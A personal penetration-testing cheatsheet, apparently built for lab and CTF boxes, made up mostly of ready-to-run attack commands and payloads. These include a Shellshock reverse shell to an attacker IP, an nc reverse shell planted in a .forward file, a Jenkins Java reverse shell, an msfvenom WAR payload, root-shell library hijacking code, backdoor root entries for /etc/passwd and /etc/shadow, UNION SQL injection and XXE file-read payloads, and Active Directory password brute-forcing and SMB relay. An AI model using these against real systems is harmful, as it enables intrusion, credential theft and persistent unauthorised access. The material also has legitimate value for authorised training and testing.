# My Notes / Cheatsheet
### Last Updated: 11 Sep 2021
Notes related to Vuln Assmnt/PenTesting 

#### Approach for Compromising a box
> 1. Identify open ports (**nmap/autorecon/rustscan**), enumerate ports (TCP+UDP) for services.
> 1. Maybe reset the box / IP if nothing found? 
> 1. Run **gobuster/wfuzz** and identify DIR and FILES present. Try using 02 diff wordlists. BurpSuite also has crawler. 
> 1. To enumerate the version of web app, can try http://website:port/readme.md or http://website:port/CHANGELOG http://website:port/README etc ? 
> 1. Run **nikto**, Have you read the source code ? If its a website look whats running ?
> 1. Try NC or CURL the service and see the output ? Anything unsual or weird in header?
> 1. Authentication can be bypassed by **SQLi Auth Bypass** or maybe try **Password Spray** or **BruteForce** or **Default Credentials**.
> 1. Maybe running **CEWL** for a good wordlist generation ?. 
> 1. Wordpress, Joomla, October, Phpmyadmin, Mantis, Adminer etc.
> 1. Running tools e.g **wpscan** or **joomscan** can help further enumeration.
> 1. Try running **Hydra** with HTTP module for brute forcing.
> 1. Cewl can be used to generate a custom wordlist if "/usr/share/wordlists/rockyou.txt" fails. 
> 1. Custom built web normally has:
> 1. SQL injection - **Authentication bypass** & **Database dump** & **Upload malicious file**.
> 1. XSS - Alerting messages and getting cookies
> 1. LFI - **.php?file=/etc/passwd** - Try fuzzing it with WFUZZ. Reading **LOG** files to acheive RCE or Reading **SSH** key files.
> 1. PHP assert ftn to bypass - e.g. http://192.168.10.30/index.php?page=' and die(system("ls")) or '	
> 1. Command Injection - Try Special characters e.g. " ; , | , & , && " etc. ${IFS} is space --- Can help in achieving ComInj. 

#### masscan tcp
```bash masscan -p1-65535 --rate=1000 192.168.78.147 -e tun0 | tee 004_mass.scan.log```

#### PrivESC Methodology for Linux
> 1. Creds file or any misconfiguration file? (**find or grep** command)
> 1. SUDO commands this user can run ? (try running ```sudo -l```) 
> 1. SUID binaries present (use ``` find / -perm -4000 -ls 2>/dev/null``` command or **suid3num python** script)
> 1. Is there SQL database, try enumerating it ? Maybe it has linux user password in it ? 
> 1. Running ports / services on this box ? (use **netstat** or **ss** command)
> 1. Pspy ?
> 1. Kernel or other exploits e.g. exploits for SUDO ?
> 1. **Linpeas** or **LinEnum** or **Linux Exploit Suggester**
> 1. **LD PreLoad Stuff - Use 'ldd' command to see the dependent .so files** --> https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/


#### PrivESC Methodology for Linux - Dynamic Library Hijacking (if a binary has .so missing)
> 1. Identify a binary (probably SUIDis set) and group/owner is root:root
> 1. ldd /usr/bin/custombinary (to see the dependent .so files). Lets assume our file is **libfowzmalbec.so**
> 1. First identify the location to place the .so file (writeable directory), for this read the **.conf** files inside the **/etc/ld.so.conf.d/**
> 1. is **ldconfig** is loading itself via **cronjob** or allowed to configured **manually** 
> 1. use **strings** against the binary to check the name of **custom function**, lets assume it shows us **fowzmalbec**
> 1. gcc rootshell.c -o vulnlib.so -shared -Wall -fPIC -w
> 1. gcc rootshell.c -o custom_function_name.so -shared -Wall -fPIC -w
> 1. place the .so file in a writeable directory from .conf file of ld.so.conf.d/
> 1. if you get some error like [gcc: error trying to exec 'cc1': execvp: No such file or directory], trying setting the $PATH variable 
> 1. try running that binary, should get **root** shell
```c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
setuid(0); setgid(0); system("/bin/bash");
}

or

#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void fowzmalbec() 
{
setuid(0); setgid(0); system("/bin/bash");
}
```
#### PrivESC Methodology for Linux - writeable PATH
> 1. Usually normal $PATH is -> ```/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin ```
> 1. If any of the above is writeable, add your custom script.
> 1. Check for a cronjob e.g **run-parts** on Ubuntu is present in **/bin** and if **/usr/local/bin** is writeable, we can make our own malicious **REV shell** or **BASH SUID** script in **/usr/local/bin** as **run-parts** and this will do the work. 

#### PrivESC Methodology for Linux - setting SUID bit on /bin/bash
> 1. Make a bash script file with following contents and make file executable. 
```bash
#!/bin/sh

chmod +s /bin/bash
```
> 1. check the **SUID** bit set on **/bin/bash**.
> 1. ```bash /bin/bash -p ``` (you shoud be **root**).

#### PrivESC Methodology for Linux - /etc/passwd 
> 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
> 1. Making user **fm** the root by typing command ->  echo 'fm::0:0:root:/root:/bin/bash' >> /etc/passwd
> 1. openssl for generating password hashes command -> openssl passwd -1
> 1. username:password === **skinny1:123** ```echo 'skinny1:$1$UcH1bqbq$q2aTjHzGSqyXJxsE92LRw1:0:0:root:/root:/bin/bash' >> /etc/passwd```
> 1. or use perl for generating password. (e.g. command ```perl -le 'print crypt("pass123", "abc")'``` will genrate hash of **abBxjdJQWn8xw**)
> 1. username:password === **skinny2:pass123** ```echo 'skinny2:abBxjdJQWn8xw:0:0:root:/root:/bin/bash' >> /etc/passwd```

#### PrivESC Methodology for Linux - /etc/shadow
> 1. $6$ password hash can be generating by running ```openssl passwd -6```
> 1. **/etc/shadow** ADD this entry (password===**123**) $6$IIIDY9Qfqb8kaEoT$x31QacmGJzff27wPu2FdxRWDYcDK4nGCGGMauoVcU3MqnvQWvpdoUQsMJEk2KrG4H8TbeCOVxHPVgVvHCFAR3/
> 1. Orignal ```root:$6$fxS/o9DNpawvWAzM$Mary1W5dFiICVWi3dmGL4nXbnMT782p/5d3m3VFaCW1LX3EdLKj4OTXDEZA.ntOHIhWYHxeD4KxmvkNHMMlAq0:18825:0:99999:7:::```
> 1. Modified ```root:$6$IIIDY9Qfqb8kaEoT$x31QacmGJzff27wPu2FdxRWDYcDK4nGCGGMauoVcU3MqnvQWvpdoUQsMJEk2KrG4H8TbeCOVxHPVgVvHCFAR3/:18825:0:99999:7:::```

#### PrivESC Methodology for Linux - /etc/sudoers
> 1. john ALL=(root) /usr/bin/python3 /home/john/file.py #Orignal Command
> 1. john ALL=(ALL:ALL) ALL #Modified for PrivESC
> 1. make sure /etc/sudoers is has correct permsissions by running ```sudo chmod 0555 /etc/sudoers```


#### Pivoting crap - MSF, socks4a and proxychains
> 1. ``` use msf exploit/multi/handler ```
> 1. get session as reverse shell
> 1. upgrade the session to meterpreter by running command --> ``` sessions -u 1 ```
> 1. go to upgraded meterpreter session and type the autoroute command ---> ``` run autoroute -s <the network you want to access> ```
> 1. to see if the new network is accessible, run **ping sweep* by typing command --->  ``` use -> multi/gather/ping_sweep ```. use new network and meterpreter session number.
> 1. to set up socks4a server ---> ```use auxiliary/server/socks4a```
> 1. edit proxychains.conf, add ```sock4a``` proxy with 127.0.0.1 and port 1080.
> 1. next run proxychains with sudo before nmap. remember proxychains can only get TCP/UDP no ICMP, so use nmap something like ```sudo proxychains nmap -sT -sC -sV -r -v -Pn <IP> ```
  
#### cgi-bin folder or ShellShock
> e.g from vulnhub symfonos v3 following gives Rev Shell @ port 9999.\
> ``` curl -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.10.100/9999 0>&1' http://192.168.10.10/cgi-bin underworld/test.sh ```

#### Portforwarding via BurpSuite
> 1.  Under "Proxy Listeners" add new listener on random port [e.g TCP9000] and select option "All Interfaces". In "Request Handling" tab give the IP and Port [e.g IP2:80] of server you want to access. Now if you open http://IP1:9000 it will redirect to http://IP2:80

#### FTP download a directory 
> 1. ftp://192.168.75.65/Logs
> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//absolute/path/to/directory
> 1. wget -r -nH --cut-dirs=5 -nc ftp://anonymous:nopassneeded@192.168.75.65//Logs
> 1. ncftp -u [user] -p [pass] [server]

#### Exploiting Redis service --- Usually running on 6379
> 1. "Redis Load Module" technique, for this you need to upload a file to SERVER, so something like FTP or SSH with WRITE access
> 1. Download this repo -> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
> 1. Run "make" command and put the "module.so" file to server
> 1. Next connect to Redis server via telent; command - telnet 192.168.XXX.XXX 6379
> 1. and load this moudle; command - MODULE LOAD /path/of/module.so
> 1. if everything goes well, you should see "+OK"
> 1. in redis run command: system.exec "id" and you should see "id" command output

#### SSH Port forwarding local service 8080
> using **socat** for local port forwarding. In this example port 8080 is running locally and we will forward and make it public to 8089.\
> socat TCP-LISTEN:8089,fork TCP:127.0.0.1:8080

#### wpscan commands
> 1.  ``` wpscan -e ap --rua --disable-tls-checks --detection-mode aggressive --plugins-detection aggressive -k --url https://xxx.xxx ```

#### Local --- SSH Port forwarding local service 5901 (VNC) - HackMyVM Box Level
> 1. using SSH (Kali IP: 192.168.10.100, Level IP: 192.168.10.11).\
> 1. there is a service running on port 5901 locally.\
> 1. ss -tupln output --> 127.0.0.1:5901 (locally) && 0.0.0.0:65000 (global) && :80(global).\
> 1. From Kali Box run: ssh -L 5901:localhost:5901 one@192.168.10.11 -p 65000.\
> 1. Now you can acess that port 5901 locally i.e. (from Kali Box: http://127.0.0.1:5901) .\
> 1. **VNC open session** vncviewer -passwd remote_level 127.0.0.1:5901

#### Remote --- SSH Port forwarding local service 8080 to remote IP 8081  - HackMyVM Box Controller
```ssh -R 192.168.10.101:8081:127.0.0.1:8080 root@<KALI IP> ```

#### Create SSH key for another user
```ssh-keygen -C john@darkhole```

#### Fuzzing LFI
> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" ```
> 1. ``` wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j7b5fl" -u http://192.168.10.13/bluesky/port.php?file=FUZZ --hw 245 -H "User-Agent:Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -P 127.0.0.1:8080:HTTP ```
  
#### Subdomain enum 
> 1. ``` wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.local" --hw 2867 -t 50 192.168.10.33 ```
> 1. ``` gobuster vhost -q -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 192.168.10.33 ```
#### Making Shell Interactive - Linux 
> 1. **In reverse shell** 
> 1. ``` python -c 'import pty; pty.spawn("/bin/bash")' ```
> 1. ``` python3 -c 'import pty; pty.spawn("/bin/bash")' ```
> 1. ``` Ctrl-Z ```

> 1.  **In Attacker console**
> 1. ``` stty raw -echo ```
> 1. ``` fg ```

> 1. **In reverse shell**
> 1. ``` reset ```
> 1. ``` export SHELL=bash ```
> 1. ``` export TERM=xterm-256color ```
> 1. ``` stty rows <num> columns <cols>; e.g stty rows 29 columns 103 stty rows 34 columns 134```

> 1. **In Attacker console**
> 1. ``` stty size ``` (to find ROWS and COLUMNS value)

#### Setting up PHP server
> 1. To execute a PHP script file, in command line simply type -> php <file name.php>
> 1. to start a php based webserver, simply type -> php -S localhost:8000
 
#### Tomcat 8080 bruteforcing the Authentication
	
> 1. ```hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt -I -u -f 192.168.10.7 -s 8080 http-get /manager/html -V -F```
> 1. **Here is the file in which creds are saved --->** ```/etc/tomcat[5,6,7,8,9]/tomcat-users.xml``` e.g ```/etc/tomcat7/tomcat-users.xml```
> 1. Deploy this payload to tomcat and get reverse shell ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.10.100 LPORT=8080 -f war -o myrev.war```
	
#### postgres - psql 
> 1. ```bash psql -h 192.168.250.47 -p 5437 -U <username>  -W```
> 1. Default username password can be postgres:postgres
> 1. Get exact version ```bash SELECT version();```
> 1. For command execution (Tested on PostgreSQL 11.7 (Debian 11.7-0+deb10u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 8.3.0-6) 8.3.0, 64-bit) :
> 1. ```bash \c postgres```
> 1. ```bash DROP TABLE IF EXISTS cmd_exec;```
> 1. ```bash CREATE TABLE cmd_exec(cmd_output text);```
> 1. ```bash copy cmd_exec FROM program 'pwd';```
> 1. ```bash SELECT * FROM cmd_exec; ```

#### git nonsense
> 1. For cloning over SSH, first create a config file under ~/.ssh directory
```bash
Host 192.168.74.125
        IdentityFile /var/tmp/075_Hunit/004_git_keys/keys/id_rsa
```
> 1. Next clone the repo if SSH is running on 43022 ```bash git clone ssh://git@192.168.74.125:43022/git-server```
> 1. To clone local repo local to remote git repo do following:
```bash
git config --global user.email "skinny@noemail.com"
git config --global user.name "skinny"
git add .
git commit
git push origin master
```
#### SQL injection
> 1. Flow: DB -> Table -> Column Name - Data
> 1. Find injection point.
> 1. #Finding the exact number of columns before running UNION command.
> 1. ```bash search=mary'+union+select+1--+%3b ```
> 1. ```bash id=1' union select 1,2,3,4,5-- -;```
> 1. DO @@verision or version() or sleep(5) for testing purposes.
> 1. ```bash id=0' union select 1,@@version,3,4,5,6-- -; ```
> 1. ```bash id=0' union select 1,sleep(5),3,4,5,6-- -; ```
> 1. Find the names of DATABASES present.
> 1. ```bash search=mary' union SELECT concat(schema_name),2,3,4,5,6 FROM information_schema.schemata-- -;```
> 1. ```bash id=0' union select 1,GROUP_CONCAT(CONCAT(schema_name)),3,4,5,6 FROM information_schema.schemata;-- -;```
> 1. Find the tables name of a particular DATABASE.
> 1. ```bash search=mary' union SELECT concat(TABLE_NAME),2,3,4,5,6 FROM information_schema.TABLES WHERE table_schema='Staff' -- ; ```
> 1. ```bash  id=0' union SELECT 1,GROUP_CONCAT(CONCAT(TABLE_NAME)),3,4,5,6 FROM information_schema.TABLES WHERE table_schema='darkhole_2'-- -;```
> 1. Find the columns name of a particular TABLE
> 1. ```bash search=mary' union SELECT column_name,2,3,4,5,6 FROM information_schema.columns WHERE table_name = 'StaffDetails' -- ;```
> 1. ```bash id=0' union SELECT 1,GROUP_CONCAT(CONCAT(column_name)),3,4,5,6 FROM information_schema.columns WHERE table_name = 'users' -- ;```
> 1. Dumping the data. 
> 1. ```bash  search=mary' union SELECT group_concat(Username,":",Password),2,3,4,5,6 FROM users.UserDetails-- ;```
> 1. ```bash 0' union select 1,GROUP_CONCAT(CONCAT(id,":",user,":",pass)),3,4,5,6 FROM darkhole_2.ssh-- -;```
	

#### Stegnography
> 1. ```bash stegseek doubletrouble.jpg```
	
#### Bypassing WAF by **X-Forwarded-For**
> 1. ```bash X-Forwarded-For: localhost ```
	
### CURL via POST
> 1. ```bash curl -XPOST http://192.168.198.134:13337/update -H 'Content-Type: application/json' -d '{"user":"test","url":"http://192.168.49.19
8:22/myshell.elf"}'```
> 1. in BurpSuite
```bash
POST /update HTTP/1.1
Host: 192.168.198.134:13337
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 67
Connection: close

{

	"user":"clumsyadmin",
	"url":"http://192.168.49.198:22/myshell.elf"

}	
```
	

#### XXE injection
```bash
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]>
		<bugreport>
		<title>&xxe;</title>
		<cwe>&xxe;</cwe>
		<cvss>&xxe;</cvss>
		<reward>&xxe;</reward>
		</bugreport> 
```
#### XXE injection Ladon Framework for Python 0.9.40 for via BurpSuite Proxy
```bash
curl -- proxy http://127.0.0.1:8080 -s -X $'POST' \
-H $'Content-Type: text/xml;charset=UTF-8' \
-H $'SOAPAction: \"http://192.168.187.161:8888/muddy/soap11/checkout\"' \
--data-binary $'<?xml version="1.0"?>
<!DOCTYPE uid
[<!ENTITY passwd SYSTEM "file:///etc/passwd">
]>
<soapenv:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"
xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\"
xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"
xmlns:urn=\"urn:muddy\"><soapenv:Header/>
<soapenv:Body>
<urn:checkout soapenv:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">
<uid xsi:type=\"xsd:string\">&passwd;</uid>
</urn:checkout>
</soapenv:Body>
</soapenv:Envelope>' \
'http://192.168.187.161:8888/muddy/soap11/checkout' | xmllint --format -	
```
#### Webdav
> 1. Cracking webdav password ```bash john --wordlist=/usr/share/wordlists/rockyou.txt webdav.passwd```
> 1. Webdav password location probably ```bash var/www/html/webdav/passwd.dav```
> 1. Uploading PHP rce on WebDav via CURL ```curl -X PUT -u administrantor:password http://abc.com/webdav/myrce.php --data-binary @"/usr/share/webshells/php/codeexec.php"``` 
	
#### Sending email via TELNET
> 1. ```bash telnet  192.168.227.157 25```
> 1. ```bash helo skinny```
> 1. ```bash mail from:<fox@localhost>```
> 1. ```bash rcpt to:<fox@localhost>```
> 1. ```data``` (send email and hit fullstop (.) to complete message body)
> 1. If everything is correct, the email should send. 
	
#### Procmail
> 1. Procmail is used to process / forward emails.
> 1. If .forward is present, inject your malicious reverse shell in it
> 1. ```bash echo "|nc 192.168.118.11 9001 -e /bin/bash" > .forward```
> 1. Send an email and you should catch the reverse shell
	
#### Scripts & Utilities
> 1. Extract IP addresses out a file - ```bash sed '/\n/!s/[0-9.]\+/\n&\n/;/^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}\n/P;D' {file name}```

#### Hashcat Generate Custom Wordlist
> 1. hashcat --force words -r /usr/share/hashcat/rules/append_specialchars.rule -r /usr/share/hashcat/rules/best64.rule --stdout > hashcardDict.txt
> 1. /usr/share/hashcat/rules/append_specialchars.rule ---> has special characters specified e.g. ! @ # *

#### Adding new exploit to msf
> 1. Download the exploit (msf ruby file)
> 1. ```bash cp HP_Jetdirect_Path_Traversal_Arbitrary_Code_Execution.rb /usr/share/metasploit-framework/modules/exploits/multi/local/```
> 1. updatedb
> 1. run msfconsole
> 1. exploit should come in 
	
#### Linux tips
> 1. convert next line to white space `cat file.txt | tr '\r\n' ' '`
> 1. delete white spaces from a file `cat file.txt | tr -d ' '`
> 1. print only 1st field before ":" `cut -d ":" -f1  myfile.txt.2 > usernames`
> 1. covert all from Uppercase to Lowercase ```echo "$a" | tr '[:upper:]' '[:lower:]'```
  
#### Cracking passwords from .pcap file
> 1. ```aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
	
#### Joomla Reverse Shell
> 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
> 1. https://vk9-sec.com/reverse-shell-on-any-cms/

#### Docker breakout container
> 1. If docker user is **root**.
> 1. ```docker run -v /:/mnt --rm -it alpine chroot /mnt /sh```
> 1. The above command will download a new alpine image, giving us root user access. Can be checked with ```id``` command.
	
#### Docker goinside a container
>1. First check what docker containers are running by runnig ```docker ps```. 
>1. To go inside a container, run ```bash docker exec -it -u 0 <container id> /bin/sh``` or ```bash docker exec -it -u 0 <container id> /bin/bash```

### Jenkins reverse shell - Linux
```bash
String host="<IP>";
int port=<port>;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
### TCPDUMP
> 1. tcpdump -i enp3s0 -s 65535 port not 22 and port not 53 and port not 22022 and not icmp and not arp and not icmp6 -w /dev/shm/001.pcap
> 1. tcpdump -i eth0 -s 65535 port not 22

#### Go inside a docker
> 1. ```docker container ls```
> 1. ```docker exec -it -u 0 '1ef49e37fb8f'  /bin/bash```

#### Windws Tricks
##### Download a file in Windows via certutil
> 1. ```certutil -urlcache -split -f http://192.168.10.100/nc.exe nc.exe```

##### Download a file in Windows via FTP client 
> 1. on Kali box first install module of ftp by running: ```pip install pyftpdlib```
> 1. start FTP server: ```python -m pyftpdlib -p 21```
> 1. on Windows box type command: ```echo open 10.10.16.185 21> ftp.txt&echo USER anonymous >> ftp.txt&echo anonymous>> ftp.txt&echo bin>> ftp.txt&echo GET nc.exe ftp.txt&echo bye>> ftp.txt```
> 1. The above command will create a ftp.txt file which will have commands to download the file.
> 1. Finally run: ```ftp -v -n -s:ftp.txt```
> 1. and file will be downloaded. 

##### RCE via PHP system on Windows server - LFI - Log Poision
> 1. Use "seclist ---> LFI ---> Windows file" for fuzzing/testing LFI
> 1. A good location can be ---> ```c:\windows\system32\drivers\etc\hosts```
> 1. To test whether you have you can do RCE, try adding this to ```UserAgent field --- <?php system('dir');?>```
> 1. Try loading the log file and you should see files listed. 

##### Shell on Windows via nc.exe
> 1. Dowload nc.exe --- ```certutil.exe -urlcache -split -f http://192.168.49.202:445/nc.exe```
> 1. Get reverse shell --- ```nc.exe 192.168.49.202 4443 -e cmd```


##### PrivESC Methodology for Windows
> 1. Run commands such as -> whoami --- whoami /priv [to see the privileges]
> 1. Exploits can be: Kernel, Service
> 1. Run winpeas with fast, searchfast or cmd options.
> 1. Run multiple scripts e.g windows-exploit-suggester or sharup or juciy potato etc. 
> 1. Look for exploits on -> https://github.com/SecWiki/windows-kernel-exploits
> 1. find OS details - ```systeminfo | findstr /B /C:"OS Name" /C:"OS Version"```
> 1. total users present - ```net users```
> 1. specific user details - ```net user <username>```
> 1. FW status - ```netsh firewall show state```

##### Windows add an Admin user from CMD
> 1. net user /add [username] [password] ---> ```net user /add superadmin Superadmin123$```
> 1. net localgroup administrators [username] /add ---> ```net localgroup administrators superadmin```


##### Windows Firewall from CMD
> 1. FW on --- ```netsh advfirewall set currentprofile state on```
> 1. FW off --- ```netsh advfirewall set currentprofile state off```

##### Windows RDP from CMD
> 1. enable --- ```reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
> 1. disable --- ```reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f```

  
##### Access Windows box via xfreerdp
> 1. ```xfreerdp /u:superadmin /p:Superadmin123$ /v:192.168.203.53:3389```
> 1. Or use Remmina for GUI 


#### Active Directory 
> 1. Find valid usernames ```/home/jon/Downloads/kerbrute_linux_amd64 userenum --dc 192.168.10.39 -d controller.local /usr/share/seclists/Usernames/top-usernam
es-shortlist.txt```
> 2. Try bruteforcing password for a user ```/home/jon/Downloads/kerbrute_linux_amd64 bruteuser --dc 192.168.10.39 -d controller.local /usr/share/wordlists/rockyou.txt adminis
trator```
> 3. Using crackmap exec to bruteforce a user password ```crackmapexec smb 192.168.10.39 -u administrator -d controller.local -p /usr/share/wordlists/rockyou.txt```

#### LLMNR Poisoning - Active Directory 
> 1. On Kali Linux ```responder -I eth0 -rdwv```
> 1. On Victim Machine give ```\\<KALI-LINUX IP```
> 1. Now, note down the hashes capured on Kali
> 1. Use hashid to identify the hash algo ```hashid -m '<HASH VALUE>'```
> 1. Answer can be ```[+] NetNTLMv2 [Hashcat Mode: 5600]```
> 1. Crack it via HASHCAT ```hashcat.exe -a 0 -m 5600 005_fcastleLLNMR.txt 000_dict_rockyou.txt```
					    
#### SMB Relay - Active Directory 
> 1. Instead of cracking the hash we captured in **reponder**, we can instead relay those hashes to specific machines and gain access.
> 1. To work this requires **SMB signing must be DISABLED on the TARGET** and **Relayed user credentials must be admin on the machine**.
> 1. Edit ```vim /etc/responder/Responder.conf```
> 1. ```ntlmrelayx.py -tf targets.txt --smb2support```
> 1. Who has SMB singing enabled and who has signing disabled ?
> 1. ```nmap --script=smb2-security-mode.nse -p 445 192.168.10.0/24```
> 1. On "AD" **Message signing enabled and required** however on "Machine" **Message signing enabled but not required**
	
#### Gaining Shell via SMB - Works for both Windows & Active Directory 
##### via MSF
> 1. use exploit/windows/smb/psexec
> 1. set "SMBDomain", "SMBUser", "SMBPass"
> 1. use correct payload i.e. ```windows/x64/meterpreter/reverse_tcp```
> 1. This may fail as "Windows Defender" stops this, disabling Windows Defender gives us shell.
##### Other tools
> 1. ```psexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[works with defender ON]**
> 1. ```smbexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[doesnt works with defender ON]**
> 1. ```wmiexec.py MARVEL.local/fcastle:Password1@192.168.10.25``` **[doesnt works with defender ON]**	

	
					    
	
#### Misc. 	
##### Ubuntu WSL2 on Windows 10 - SSH portforwarding to access it via Public IP
> 1. changed following in the sudo /etc/ssh/sshd_config
  ```bash
  Port 2222
  AddressFamily any
  ListenAddress 0.0.0.0
  ```
> 1. restart ssh service
> 1. netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=2222 connectaddress=<Windows or WSL IP here> connectport=2222 [ portfwd]
> 1. netsh advfirewall firewall add rule name=”Open Port 2222 for WSL2” dir=in action=allow protocol=TCP localport=2222 [ firewall]
> 1. netsh interface portproxy show v4tov4 [ to show the entries added]
> 1. netsh int portproxy reset all [ reset everything ]
	
##### Create multiple FTP users, they do not have SSH shell and add them in same group (ftp2100). Allow this group ftp2100 to edit/upload/write to /var/www/ path
> 1. ``` sudo echo "/bin/false" >> /etc/shells ```
> 1. ``` sudo addgroup ftp2100 ```
> 1. ``` sudo adduser skinnyFTP --shell /bin/false --home /var/www --ingroup ftp2100 ```
> 1. ``` sudo passwd skinnyFTP ```
> 1. ``` sudo chgrp -R ftp2100 /var/www/ ```
